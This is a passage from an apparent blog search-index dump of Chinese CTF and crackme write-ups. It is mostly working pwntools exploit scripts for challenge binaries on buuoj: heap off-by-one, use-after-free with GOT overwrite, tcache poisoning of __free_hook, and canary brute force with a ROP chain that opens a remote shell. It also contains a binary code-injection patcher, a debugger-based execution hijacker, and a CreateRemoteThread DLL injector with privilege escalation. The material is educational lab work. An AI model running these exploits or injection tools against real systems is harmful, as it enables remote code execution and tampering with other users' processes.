True)) &lt;&lt; 32)sh.sendlineafter(&#x27;input you ops count&#x27;,&#x27;0&#x27;)malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)#9new_game()store_game(0x60,&#x27;/bin/sh&#x27;.ljust(0x40,&#x27;\\x00&#x27;) + p64(0) + p64(0x31) + p64(free_hook_addr) + &#x27;\\n&#x27;)#10#写free_hooknew_game()store_game(0x20,p64(system_addr) + &#x27;\\n&#x27;)#getshelldelete_record(9)sh.interactive()\n","categories":["CTF"],"tags":["off by one"]},{"title":"ciscn_final_7(黑盒测试)","url":"/2020/07/25/ciscn_final_7/","content":"首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n\n\n程序比较复杂\n\n\n比较难逆向，其大致原理是fork了子进程做为一个调试进程，然后主进程里通过int 3中断通知调试器设置相应的寄存器，从而执行到其他地方。\n\n\n由于整个程序主逻辑全部使用中断来实现，比较难逆向，因此我们直接黑盒测试了。\n首先通过枚举choice的选项，得到了一下选项\n#110 add#120 edit#238 del#386 exit\n\n然后就进行测试，发现del功能存在UAF，可以多次del，因此，这题就比较简单了。\n#coding:utf8from pwn import *#sh = process(&#x27;./ciscn_final_7&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27363)libc = ELF(&#x27;./libc-2.27.so&#x27;)elf = ELF(&#x27;./ciscn_final_7&#x27;)atoi_got = elf.got[&#x27;atoi&#x27;]printf_plt = elf.plt[&#x27;printf&#x27;]#110 add#120 edit#238 del#386 exitdef add(size,content):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;110&#x27;)   sh.sendlineafter(&#x27;string:&#x27;,str(size))   sh.sendlineafter(&#x27;string:&#x27;,content)def add_s(size,content):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;%110c&#x27;)   sh.sendlineafter(&#x27;string:&#x27;,&#x27;%&#x27; + str(size) + &#x27;c&#x27;)   sh.sendlineafter(&#x27;string:&#x27;,content)def edit(size,new_content):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;120&#x27;)   sh.sendlineafter(&#x27;string:&#x27;,str(size))   sh.sendlineafter(&#x27;string:&#x27;,new_content)def delete(index):   sh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;238&#x27;)   sh.sendlineafter(&#x27;string:&#x27;,str(index))add(0x20,&#x27;a&#x27;*0x20) #0#double freedelete(0)delete(0)add(0x30,&#x27;b&#x27;*0x30) #1delete(1)delete(1)add(0x20,p64(atoi_got)) #2add(0x20,&#x27;c&#x27;) #3add(0x20,p64(printf_plt)) #4，修改atoi的got表为printf的pltsh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;%25$p&#x27;)sh.recvuntil(&#x27;0x&#x27;)#泄露地址libc_base = int(sh.recvuntil(&#x27;invalid choice&#x27;,drop = True),16) - 0xE7 - libc.sym[&#x27;__libc_start_main&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)add_s(0x30,p64(atoi_got)) #5add_s(0x30,&#x27;d&#x27;) #6add_s(0x30,p64(system_addr)) #7 修改atoi的got表为system#getshellsh.sendlineafter(&#x27;command&gt;&gt;&#x27;,&#x27;/bin/sh&#x27;)sh.interactive()","categories":["CTF"],"tags":["UAF","盲打"]},{"title":"ciscn_final_9(null off by one当无法shrink unsorted bin或者控制prev_size时的利用手法)","url":"/2020/06/11/ciscn_final_9/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下,safe_read函数存在一个null off by one漏洞\n\n\nDelete函数里在free之前会清空堆的内容， \n申请的堆大小是固定的，属于unsorted bin范围\n\n\n从上面看,prev_size无法受我们控制，因为堆的大小为0x100，因此prev_size是0x100的整数倍，\\x00会截断输入，即使我们先布置\\x01，然后delete后再布置\\x00也不行，因为delete函数会清空原来的内容。综上看，prev_size不能受我们控制，如果使用shrink unsorted bin size的话，也不行，因为如果shrink unsorted bin的话，要想再次从这个unsorted bin里成功切割内存，其shrink掉的那部分得伪造成一个chunk，但是delete功能会清空我们伪造的数据。并且由于大小都是0x100的整数倍，shrink不了，因此这两种方法都不可行了。\n那么，我们可以利用堆块的合并。\n\n\n假设我们连续合并这3个chunk,合并是有顺序的，先合并0、1，这将使得2的prev_size变成0x200，然后合并2，2的prev_size 0x200仍然存在。接下来，我们从中把0切割申请回来，2的prev_size仍然为0x200,然后我们利用null off by one修改1的size低1字节，利用堆块合并构造overlap chunk即可。\n#coding:utf8from pwn import *#sh = process(&#x27;./ciscn_final_9&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27466)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]def add(size,content):   sh.sendlineafter(&#x27;which command?&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size&#x27;,str(size))   sh.sendlineafter(&#x27;content&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;which command?&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;which command?&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index&#x27;,str(index))add(0xF0,&#x27;a&#x27;*0xF0) #0add(0xF0,&#x27;b&#x27;*0xF0) #1add(0xF0,&#x27;c&#x27;*0xF0) #2#3~9for i in range(7):   add(0xF0,&#x27;d&#x27;*0xF0)for i in range(3,10):   delete(i)#0放入unsorted bindelete(0)#1放入unsorted bin,此时0、1会合并，在2的prev_size处留下0x200delete(1)#2放入unsorted bin，与前面合并，但是prev_size不会清空delete(2)#0~6for i in range(7):   add(0xF0,&#x27;d&#x27;*0xF0)#由于prev_size不能任我们控制，因此，我们使用了这种方式控制9的prev_size为0x200add(0xF0,&#x27;a&#x27;*0xF0) #7add(0xF0,&#x27;b&#x27;*0xF0) #8add(0xF0,&#x27;c&#x27;*0xF0) #9#到目前，9的prev_size为0x200，接下来，我们利用null off by one构造overlap chunk#填充tcache binfor i in range(7):   delete(i)#7放入unsorted bindelete(7)#0~6for i in range(7):   add(0xF0,&#x27;d&#x27;*0xF0)delete(8)add(0xF8,&#x27;null off by one&#x27;) #7#填充tcache binfor i in range(7):   delete(i)#9放入unsorted bin，发生合并，形成overlap chunkdelete(9)#0~6for i in range(7):   add(0xF0,&#x27;d&#x27;*0xF0)#将glibc指针移动到7add(0xF0,&#x27;a&#x27;) #8show(7)sh.recvuntil(&#x27;&gt; &#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_sone_gadget_addr = libc_base + 0x4f322print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)add(0xF0,&#x27;b&#x27;) #9与7重合delete(0)delete(1)#double freedelete(7)delete(9)add(0xF0,p64(free_hook_addr)) #0add(0xF0,&#x27;a&#x27;) #1add(0xF0,p64(one_gadget_addr))#getshelldelete(1)sh.interactive()","categories":["CTF"],"tags":["tcache","unsorted bin","off by one","堆风水"]},{"title":"Cnss(canary爆破)","url":"/2020/02/14/cnss/","content":"首先，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，发现是一个服务器程序，[每接收到连接请求后就会fork一个子进程来处理。]{.mark}\n\n\n代码太长，看似很复杂\n\n\n我们发现eval函数存在栈溢出，并且由于没有开启PIE，那么我们只需要泄露了canary的值就能轻松ROP了。\n\n\n关键是canary泄露不了。然而，[我们可以一字节一字节的爆破它]{.mark}。我们知道，[canary的值是随机的，但是由于这是一个子进程，从父进程fork来的，因此它的数据和父进程里的一样。子进程崩溃不影响父进程，只要父进程没有重新运行，那么它的canary值就没变。每次fork的子进程里的canary值一样。因此，我们单字节单字节的爆破，当子进程崩溃，就认为不对，当子进程没有崩溃，说明当前这字节的canary数据，我们猜对了，继续爆破下一字节。]{.mark}\n#开始爆破canary  canary = &#x27;\\x00&#x27;  for i in range(1,8):     print &#x27;===crack last(&#x27;,i+1,&#x27;)byte====&#x27;     for x in range(0,0x100):        print &#x27;trying &#x27;,hex(x)        stack_overflow(0x18E + i + 1,&#x27;a&#x27;*0x18E + canary + p8(x))        try:           sh.recv()           sh.recv()        except:           sh.close()           init_connection()           continue        canary += p8(x)        break  canary = u64(canary)  \n\n当我们得到canary后，就是正常的栈溢出了。先是ret2csu，去执行write函数泄露libc地址，然后我们构造ROP，利用栈溢出写入即可。\n综上，我们完整的exp脚本\n#coding:utf8  from pwn import *  from LibcSearcher import *    elf = ELF(&#x27;./cnss&#x27;)  socket_got = elf.got[&#x27;socket&#x27;]  write_got = elf.got[&#x27;write&#x27;]  csu_pop = 0x40481A  csu_call = 0x404800  eval_ret = 0x401F15  pop_rdi = 0x404823  #pop rsi;pop rdi;ret  pop_rsi = 0x404821    def init_connection():     global sh     #sh = remote(&#x27;127.0.0.1&#x27;,1337)     sh = remote(&#x27;192.168.232.130&#x27;,1337)     sh.send(p32(0x4D435052))     sh.send(p32(0) + p32(1,endian = &#x27;big&#x27;))    def stack_overflow(size,content):     sh.send(p32(0x4D435052))     sh.send(p32(0) + p32(3,endian = &#x27;big&#x27;))     sh.send(p32(0)*2)     sh.send(p32(0x10,endian = &#x27;big&#x27;))     sh.send(&#x27;t&#x27;*0x10)     sh.send(p32(size,endian = &#x27;big&#x27;))     sh.send(content)      init_connection()  #开始爆破canary  canary = &#x27;\\x00&#x27;  for i in range(1,8):     print &#x27;===crack last(&#x27;,i+1,&#x27;)byte====&#x27;     for x in range(0,0x100):        print &#x27;trying &#x27;,hex(x)        stack_overflow(0x18E + i + 1,&#x27;a&#x27;*0x18E + canary + p8(x))        try:           sh.recv()           sh.recv()        except:           sh.close()           init_connection()           continue        canary += p8(x)        break  canary = u64(canary)  #canary = 0x679961d7ebc53500  #canary = 0x4202eb3d320ee000  print &#x27;canary=&#x27;,hex(canary)  #sh.recv()  #泄露socket函数地址  rop = p64(csu_pop)  rop += p64(0) + p64(1)  rop += p64(write_got)  rop += p64(0x8) + p64(socket_got) + p64(4)  rop += p64(csu_call)  payload = &#x27;a&#x27;*0x18E + p64(canary) + p64(0) + rop  stack_overflow(len(payload),payload)  socket_addr = u64(sh.recv().ljust(8,&#x27;\\x00&#x27;))  libc = LibcSearcher(&#x27;socket&#x27;,socket_addr)  libc_base = socket_addr - libc.dump(&#x27;socket&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  dup2_addr = libc_base + libc.dump(&#x27;dup2&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;dup2_addr=&#x27;,hex(dup2_addr)  sh.close()  #getshell  init_connection()  #重定向0和1文件描述符到socket的fd  raw_input()  rop = p64(pop_rdi) + p64(4) + p64(pop_rsi) + p64(0)*2 + p64(dup2_addr)  rop += p64(pop_rdi) + p64(4) + p64(pop_rsi) + p64(1)*2 + p64(dup2_addr)  rop += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  payload = &#x27;a&#x27;*0x18E + p64(canary) + p64(0) + rop  stack_overflow(len(payload),payload)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","爆破"]},{"title":"适合破解新手的160个crackme练手 crackme41","url":"/2019/10/06/crackme41/","content":"让我们先看看游戏规则:\ndefiler’s reversme no.1\n\nThe task of this little, lame reverseme is to add some code to it.\nThe code you have to add will be triggered by the ‘Exit’ menu and should\nlook like this:\nA messagebox should appear asking the user “Do you fickbirne really want to quit?”.\nIts buttons should be ‘Yes’ and ‘No’. If the user clicks ‘Yes’, simply exit the\nprogram in a clean way, if the user clicks ‘No’ just do NOT exit the program\n(it’s up to you what will happen when the user clicks ‘No’).\nValid solutions are solutions with a tutorial explaining what you did,\nexplaining the code you added and the modified binaries.\nMail your solution to defiler@immortaldescendants.org\nValid solutions will be published on http://immortaldescendants.org,\nthe first solution will be on http://defiler.cjb.net\nthats it.. i hope i didn’t forget any more unimportant stuff ;)\nbest regards,\ndefiler\n我们需要在没有源代码的情况下，给退出菜单增加一个对话框\n\n\n打开这个程序，点击Exit没有任何反应，我们需要做的就是点击这个Exit后弹出一个确认退出的对话框，并处理对话框的是与否事件\n这个程序是delphi语言写的，我们首先就是使用Dede查看一下一些信息\n\n\n发现只有一个About的事件处理，我们记下地址，然后打开ollydbg，跳转到这个地址处\n\n\n这里就是弹出关于对话框的代码了，我们可以模仿这个代码，写退出的对话框\n现在的关键问题是，我们该在哪里添加代码?\n经过浏览，我们发现程序结尾处(0x43E4BC，在文件中的偏移为0x3D8BC)有很大一片空间，我们或许可以把代码加到这里\n\n\n好吧，就开干，先定义需要的字符串\n\n\n字符串呢，最好内存对齐，因此，我们在字符串结尾有好几个0\n然而，当我们把字符串每个字符的ascii码搞上去后，出现了上图所示的情况，ollydbg没有把它识别成字符串，当这不影响我们后续的操作。\n上图，在0x43E4BC到0x43E4C3定义的是字符串”Exit”,待会会用作对话框的标题，\n在0x43E4C4到0x43E4ED定义的是字符串” Do you fickbirne really want to quit?”，待会会用作对话框的提示内容\n\n\n接下来，我们就模仿那个关于对话框(有人模仿我的脸还会模仿我的代码^_^)，写了些代码。\n来我们分析一下代码\n首先我们push 0x24，而那个about是push 0x40，这个值代表了对话框样式,0x24的样式如下\n!Title\nXXXXXXXXXX\n|Yes| |No|\n这就是我们需要的样式\n然后我们修改了一下两处地址，\nmov ecx,0x43E4BC ;指向我们定义的标题”Exit”\nmov edx,0x43E4C4 ;指向我们定义的提示内容”Do you fickbirne really want to quit?”\n接下来三句照抄\nmov eax,dword ptr ds:[0x43FBD0]\nmov eax,dword ptr ds:[eax]\ncall 0043CC14 ;显示对话框\nmov ebx,eax ;eax返回的按钮的点击情况，经过调试发现eax &#x3D;&#x3D; 7时点击的是”No 否”按钮，eax &#x3D;&#x3D; 6时点击的是”Yes是”按钮\ncmp ebx,0x7\nje 0x0043E512 ;如果点击的是否，我们跳到retn处，即函数执行结束\ncall 0040122C ;否则点击的是”是按钮”,我们调用这个ExitProcess()函数退出程序\nretn\n那么这个ExitProcess的地址是如何找到的呢????\n\n\n首先，我们在ollydbg输入bpx ExitProcess命令\n然后我们打开断点视图\n\n\n我们发现，本程序其他地方正好有调用这个函数，那么我们自己点进去，复制汇编代码到我们自己需要的地方\n\n\nOjbk\n现在我们先运行一下程序，没有出错，说明这里不影响程序执行\n\n接下来，我们需要做的是，在某个地方来调用我们的这段代码，即响应Exit菜单事件，为了找到事件处理的代码，我们先在About的事件响应处断点\n\n\n然后运行程序，点About触发断点，然后我们单步执行，执行完retn后就会返回到调用者的地址处\n\n\n继续单步，返回到更上一个的调用者处\n到这里了，我们把两个call都断点，慢慢调试看看\n\n\n重新运行，我们发现不管是点击About还是Exit，都可以触发这里的断点。\n先分析第一个call函数，我们执行完这个call后，观察到edx的变化\n当我们点击”About”菜单时，edx值变为2;当我们点击”Exit”菜单时,edx的值变为3。我们可以根据这个值来判断点击的是哪个按钮\n\n\n接下来，我们分析第二个call，我们步入函数看看，我们单步执行，我们比对About和Exit的执行步骤，发现，0x42F41E处的执行不一样，我们点击Exit时会跳过最后的call dword ptr ds:[ebx+0x80]，而我们点击About时，发现这个call跳到的就是About对话框处。由此，我们可以肯定,[ebx+0x80]处存储着需要执行的事件的地址。当我们点击Exit时，这个地址里面是空值，因此我们要做的就是在这个跳转之前，给[ebx+0x80]处赋上我们植入的代码段的地址\n那么，我们再在程序末尾0x43E513添加一个函数来处理这件事情\n\n\n我们把这里修改一下，来调用我们准备写的那个代理函数,修改0x430539处的汇编代码为\nCall 0x43E513\n\n\n然后这两条指令都被覆盖了，因此，我们需要在代理函数里把mov edx,dword ptr ds:[eax]重新添加上去\n\n\n现在我们开始写0x43E513处的代理函数\ncmp edx,0x3 ;判断是否是Exit按钮\nmov edx,dword ptr ds:[eax] ;之前被覆盖掉的那条指令，我们重新添加上去\njnz 0x0043E524 ;如果不是Exit按钮，我们直接调用下面的call\nmov dword ptr ds:[eax+0x80],0x43E4EE ;是Exit按钮，我们需要给[eax+0x80]存入我们的事件(退出对话框)的地址\ncall dword ptr ds:[edx+0x40]\nretn\n就这样，我们就完成了任务\n\n\n现在，我们用c++写一个注册机\n#include &lt;iostream&gt;  #include &lt;stdint.h&gt;   #include &lt;cstdio&gt;  #include &lt;cstring&gt;    using namespace std;    //我们需要在文件中偏移0x2F939处替换为下列机器码，这是调用我们自己写的那个代理函数，从而实现了对Exit选项的响应   uint8_t crack[] = &#123;      //00430539  call defiler_.0043E513      0xE8,0xD5,0xDF,0x00,0x00  &#125;;    //我们需要在文件中偏移0x3D8BC处植入下列机器码，因为该出是空余的空间可以用来植入我们自己的代码   uint8_t code[] = &#123;      //0043E4BC ascii &quot;Exit&quot;      0x45,0x78,0x69,0x74,0x00,0x00,0x00,0x00,      //0043E4C4 ascii &quot;Do you fickbirne really want to quit?&quot;      0x44,0x6F,0x20,0x79,0x6F,0x75,0x20,0x66,      0x69,0x63,0x6B,0x62,0x69,0x72,0x6E,0x65,      0x20,0x72,0x65,0x61,0x6C,0x6C,0x79,0x20,      0x77,0x61,0x6E,0x74,0x20,0x74,0x6F,0x20,      0x71,0x75,0x69,0x74,0x3F,0x00,0x00,0x00,0x00,0x00,            //这里是我们定义的一个函数,用来显示对话框并处理事件       //0043E4EE push 0x24 对话框样式为两个按钮型       0x6A,0x24,      //0043E4F0 mov ecx,0x43E4BC 获取Exit字符串       0xB9,0xBC,0xE4,0x43,0x00,      //0043E4F5 mov edx,0x43E4C4 获取提示字符串       0xBA,0xC4,0xE4,0x43,0x00,      //0043E4FA mov eax,dword ptr ds:[0x43FBD0]      0xA1,0xD0,0xFB,0x43,0x00,      //0043E4FF mov eax,dword ptr ds:[eax]      0x8B,0x00,      //0043E501 call 0043CC14 显示对话框       0xE8,0x0E,0xE7,0xFF,0xFF,      //0043E506 mov ebx,eax 获取哪个按钮被点击       0x8B,0xD8,      //0043E508 cmp ebx,0x7 0x7代表No按钮       0x83,0xFB,0x07,      //0043E50B je 0x0043E512      0x74,0x05,      //0043E50D call &lt;jmp.&amp;kernel32.ExitProcess&gt;      0xE8,0x1A,0x2D,0xFC,0xFF,      //0043E512 retn函数结束       0xC3,            //这里是我们定义的另外一个函数，用来代理菜单的事件处理       //0043E513 cmp edx,0x3 0x3代表菜单上的Exit选项       0x83,0xFA,0x03,      //0043E516 mov edx,dword ptr ds:[eax]      0x8B,0x10,      //0043E518  jnz Xdefiler_.0043E524      0x75,0x0A,      //0043E51A  mov dword ptr ds:[eax+0x80],defiler_.0043E4EE      0xC7,0x80,0x80,0x00,0x00,0x00,0xEE,0xE4,0x43,0x00,      //0043E524  call dword ptr ds:[edx+0x40]      0xFF,0x52,0x40,      //0043E527 retn 函数结束       0xC3  &#125;;    int main() &#123;      cout &lt;&lt; &quot;请确保本注册机和程序在同一个目录...&quot; &lt;&lt; endl;      cout &lt;&lt; &quot;按回车键开始...&quot; &lt;&lt; endl;      cin.get();      cout &lt;&lt; &quot;正在植入代码...&quot; &lt;&lt; endl;      FILE * f = fopen(&quot;defiler.1.exe&quot;,&quot;rb&quot;);      fseek(f,0,SEEK_END);      int size = ftell(f);      fseek(f,0,SEEK_SET);      uint8_t *buf = new uint8_t[size];      fread(buf,1,size,f);      fclose(f);      //植入代码       memcpy(buf + 0x3D8BC,code,sizeof(code));      //修改指令，来调用我们写的代码       memcpy(buf + 0x2F939,crack,sizeof(crack));      f = fopen(&quot;defiler_cracked.exe&quot;,&quot;wb&quot;);      fwrite(buf,size,1,f);      fclose(f);      cout &lt;&lt; &quot;操作已完成&quot; &lt;&lt; endl;      cin.get();      return 0;  &#125;  \n\n","categories":["CTF"],"tags":["逆向"]},{"title":"crackme42","url":"/2019/10/07/crackme42/","content":"本题要求在不修改源程序的情况下要去除开始的那个对话框\n我们使用了调试的方法控制程序的执行，大概hook也可以用这种原理实现\n//调试器原理大概就是这样了吧 #include &lt;windows.h&gt;#include &lt;iostream&gt;using namespace std;//断点地址DWORD dwBreakPoint = 0x401000;//新的执行地址DWORD dwNewEip = 0x401013;int main() &#123;\tcout &lt;&lt; &quot;请确保本注册机与程序在同一个目录下面!&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;按任意键继续...&quot; &lt;&lt; endl; \t//该结构用于指定新进程的主窗口特性\tSTARTUPINFO si = &#123; 0&#125; ;\t//.应用程序必须将cb初始化为sizeof(STARTUPINFO)\tsi.cb = sizeof(STARTUPINFO);\t//在创建进程时相关的数据结构之一，该结构返回有关新进程及其主线程的信息。\tPROCESS_INFORMATION pi = &#123; 0 &#125;;\t//创建一个调试进程 \tCreateProcess(&quot;defiler.2.exe&quot;,NULL,NULL,NULL,FALSE,DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS,NULL,NULL,&amp;si,&amp;pi);\t//调试信息结构体 \tDEBUG_EVENT dbg;\t//每个线程内核对象都维护着一个CONTEXT结构，里面保存了线程运行的状态，\t//该结构里有各种信息，寄存器这些的，我们可以修改里面的内容达到控制程序运行的目的。 \tCONTEXT ct;\t//线程的Handle \tHANDLE h;\t//设置标记 \tct.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;\t//开始调试 \twhile (WaitForDebugEvent(&amp;dbg,INFINITE)) &#123;\t\tif (dbg.dwThreadId != pi.dwThreadId) &#123;\t\t\tContinueDebugEvent(dbg.dwProcessId,dbg.dwThreadId,DBG_CONTINUE);\t\t\tcout &lt;&lt; &quot;跳过其他线程&quot; &lt;&lt; endl;\t\t\tcontinue;\t\t&#125;\t\tswitch (dbg.dwDebugEventCode) &#123;\t\t\tcase CREATE_PROCESS_DEBUG_EVENT://调试进程的创建\t\t\t    //获取线程的句柄 \t\t\t\th = OpenThread(THREAD_ALL_ACCESS,FALSE,dbg.dwThreadId);\t\t\t\tGetThreadContext(h,&amp;ct);\t\t\t\tct.Dr0 = dwBreakPoint; //设置断点地址\t\t\t\tct.Dr7 = 0x101;\t\t\t\tSetThreadContext(h,&amp;ct);\t\t\t\tCloseHandle(h);\t\t\t\tContinueDebugEvent(dbg.dwProcessId,dbg.dwThreadId,DBG_CONTINUE);\t\t\t\tbreak;\t\t\tcase EXCEPTION_DEBUG_EVENT://接收到调试事件\t\t\t\t//断点事件\t\t\t\tif (0x4000001e == dbg.u.Exception.ExceptionRecord.ExceptionCode) &#123;\t\t\t\t\tcout &lt;&lt; &quot;捕捉到断点&quot; &lt;&lt; endl;\t\t\t\t\tHANDLE h = OpenThread(THREAD_ALL_ACCESS,FALSE,dbg.dwThreadId);\t\t\t\t\tDWORD dwPid = GetProcessId(pi.hProcess);        \t\t\t\t\tMessageBox(NULL,&quot;这是注入的对话框!&quot;,&quot;hello&quot;,0x40);\t\t\t\t\tGetThreadContext(h,&amp;ct);\t\t\t\t\t//修改相关寄存器，达到对程序的控制 \t\t\t\t\tct.Rip = dwNewEip;\t\t\t\t\tSetThreadContext(h,&amp;ct);\t\t\t\t\tCloseHandle(h);\t\t\t\t&#125;\t\t\t\tContinueDebugEvent(dbg.dwProcessId,dbg.dwThreadId,DBG_CONTINUE);\t\t\t\tbreak;\t\t\tcase EXIT_PROCESS_DEBUG_EVENT://调试进程结束\t\t\t\tContinueDebugEvent(dbg.dwProcessId,dbg.dwThreadId,DBG_CONTINUE);\t\t\t\tExitProcess(0);\t\t\t\tbreak;\t\t\tdefault:\t\t\t\tContinueDebugEvent(dbg.dwProcessId,dbg.dwThreadId,DBG_CONTINUE);\t\t\t\tbreak;\t\t&#125;\t&#125;\treturn 0;&#125;","categories":["CTF"],"tags":["逆向","windows调试API"]},{"title":"crackme46","url":"/2019/10/09/crackme46/","content":"开始拿到本题我也一脸茫然，也没有游戏说明。于是就随便看了看，发现菜单上的三个选项都提示Nope doesn’t work yet!，即这三个功能都不能用，再看看这个题目的分类是Menu，我想，这题就是要我们让这三个选项能正常使用吧，就类似于Crackme041那题，要我们加代码。开始呢，我想到的就是在结尾处添加代码，用ollydbg搜索了一下，发现很多必要的Api函数没有导入进去，手动添加又太麻烦。而且要加三个功能，汇编代码量肯定很大。于是就想起了dll注入，这个技术，我也是现学现用。它的原理是通过某种手段，让程序加载我们的dll，dll中的DllMain函数就会自动执行，我们可以把一些代码放这个函数里。这种技术也应用于许多病毒程序中。\n为什么dll注入后可以控制应用程序？\n在Windows中，每个应用程序都是独立运行在自己的内存空间，有没有发现，我们用ollydbg打开exe，第一行指令的地址总是0x401000 ,程序A从这个地址开始执行，程序B也从这个地址开始执行，但是他们互不影响，即这些地址并不是物理地址，而是一个相对的地址。每个程序有独立的地址空间，自己空间里的线程可以随便操控自己的内存，那么，如果我们把自己的dll加载到程序的空间里去，这个dll就成了程序的一部分，可以操控这个程序的内存。\n首先，我们来写dll注入程序，\n要将dll注入到一个进程中，我们利用CreateRemoteThread在exe进程中运行LoadLibrary线程来加载指定的dll文件，在这里还要注意目标exe使用的是LoadLibraryA还是LoadLibrayW，要一致才能成功，这个坑了我好久\n//注入dll  #include &lt;windows.h&gt;  #include &lt;stdio.h&gt;  #include &lt;TlHelp32.h&gt;    //根据进程名查找进程PID  DWORD getProcessHandle(LPCTSTR lpProcessName) &#123;      DWORD dwRet = 0;      HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);      if(hSnapShot == INVALID_HANDLE_VALUE) &#123;          printf(&quot;\\n获得进程快照失败%d&quot;,GetLastError());          return dwRet;      &#125;        PROCESSENTRY32 pe32;//声明进程入口对象      pe32.dwSize = sizeof(PROCESSENTRY32);//填充进程入口对象大小      Process32First(hSnapShot,&amp;pe32);//遍历进程列表      do &#123;          if(!lstrcmp(pe32.szExeFile,lpProcessName)) &#123; //查找指定进程名的PID              dwRet = pe32.th32ProcessID;              break;          &#125;      &#125; while (Process32Next(hSnapShot,&amp;pe32));      CloseHandle(hSnapShot);      return dwRet;//返回  &#125;   BOOL InjectDll(DWORD dwPID, char* szDllPath) &#123;      HANDLE hProcess = NULL;      HANDLE hThread = NULL;      HMODULE hMod = NULL;      LPVOID pRemoteBuf = NULL; //存储dll路径字符串的起始地址      DWORD dwBufSize = (DWORD)(strlen(szDllPath)+1)*sizeof(char); // dll路径字符串的大小      LPTHREAD_START_ROUTINE pThreadProc; // 存储LoadLibrary函数的地址      // 使用dwPID获取目标进程句柄      if(!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID))) &#123;          printf(&quot;OpenProcess(%d) failed!!![%d]\\n&quot;,dwPID,GetLastError());          return FALSE;      &#125;      // 在目标进程exe内存中分配szDLLName大小的内存      pRemoteBuf = VirtualAllocEx(hProcess,NULL,dwBufSize,MEM_COMMIT,PAGE_READWRITE);      // 将dll路径写入分配的内存      WriteProcessMemory(hProcess,pRemoteBuf,szDllPath,dwBufSize,NULL);      // 获取LoadLibraryW() API的地址      //注意 LoadLibraryA和LoadLibraryW，要与exe的一样，不然不能成功      hMod = GetModuleHandle(TEXT(&quot;kernel32.dll&quot;));      pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod,&quot;LoadLibraryA&quot;);      // 在对应的exe中运行线程      hThread = CreateRemoteThread(hProcess,NULL,0,pThreadProc,pRemoteBuf,0,NULL);      WaitForSingleObject(hThread,INFINITE);      CloseHandle(hThread);      CloseHandle(hProcess);      return TRUE;  &#125;  // 提权函数  BOOL EnableDebugPriv() &#123;      HANDLE hToken;      LUID sedebugnameValue;      TOKEN_PRIVILEGES tkp;      if ( ! OpenProcessToken( GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) &#123;          printf(&quot;提权失败。&quot;);          return FALSE;      &#125;      if ( ! LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;sedebugnameValue ) ) &#123;          CloseHandle( hToken );          printf(&quot;提权失败。&quot;);          return FALSE;      &#125;      tkp.PrivilegeCount = 1;      tkp.Privileges[0].Luid = sedebugnameValue;      tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //      if ( ! AdjustTokenPrivileges( hToken, FALSE, &amp;tkp, sizeof tkp, NULL, NULL ) ) &#123;          printf(&quot;提权失败。&quot;);          CloseHandle( hToken );      &#125; else &#123;          printf(&quot;提权成功！&quot;);          return TRUE;      &#125;    &#125;    int main(int argc, char* argv[]) &#123;      //提权      EnableDebugPriv();      DWORD pid = getProcessHandle(&quot;douby.exe&quot;);      char dll[50] = &quot;DllInject.dll&quot;;      if (InjectDll(pid,dll)) &#123;          printf(&quot;dll注入成功!\\n&quot;);      &#125; else &#123;          printf(&quot;dll注入失败\\n&quot;);      &#125;      return 0;  &#125;  \n\n以上程序将DllInject.dll这个文件注入到名字为douby.exe这个进程中去\n现在我们来写DllInject的代码\nBOOL APIENTRY DllMain(HMODULE hModule,      DWORD  ul_reason_for_call,      LPVOID lpReserved  )  &#123;      switch (ul_reason_for_call)      &#123;      case 